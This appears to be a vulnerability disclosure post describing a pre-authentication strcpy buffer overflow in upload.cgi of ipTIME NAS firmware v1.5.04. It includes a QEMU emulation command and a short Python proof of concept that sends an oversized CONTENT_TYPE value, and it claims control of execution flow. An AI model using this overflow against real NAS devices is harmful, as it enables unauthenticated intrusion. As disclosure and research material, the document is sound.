---
title: Buffer Overflow in upload.cgi of iptime_nas_1.5.04
date: 2025-04-25 14:17:10
tags: cve

---

**Affected Product**: iptime_nas

**Affected Firmware Versions**: v1.5.04

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: 





# Buffer Overflow in upload.cgi of iptime_nas_1.5.04





## The principle of the vulnerability



It can be observed that the vulnerability is caused by strcpy. Since the authentication logic is executed after the strcpy operation, this constitutes a **pre-authentication vulnerability**.
    

![image-20250425112559057](../res/image-20250425112559057.png)



![image-20250425112609126](../res/image-20250425112609126.png)





## Use QEMU for simulation

```
command = f'sudo chroot . ./qemu-arm-static -L ./lib -g 1234 ./usr/webroot/upload.cgi'
```



## poc：

```
import os


count_ones = 5000
content_type_value = 'A' * count_ones


command = f'sudo chroot . ./qemu-arm-static -L ./lib -g 1234 -E CONTENT_TYPE={content_type_value} ./usr/webroot/upload.cgi'


os.system(command)
    
```



## The result of the attack.

It can be seen that the stack space allocated by V8 is 08h.

![image-20250425112843647](../res/image-20250425112843647.png)

![409f26874d89240514a94b25cce067c2](../res/409f26874d89240514a94b25cce067c2.png)

![505bded03ba362093859cf7293904187](../res/505bded03ba362093859cf7293904187.png)

![7ddfa109889f3cb0ce68b3c4388b4a2c](../res/7ddfa109889f3cb0ce68b3c4388b4a2c.png)



Eventually, the overflow reaches 0xd0, and the execution flow of the program is controlled. If necessary, more overflow can be achieved.
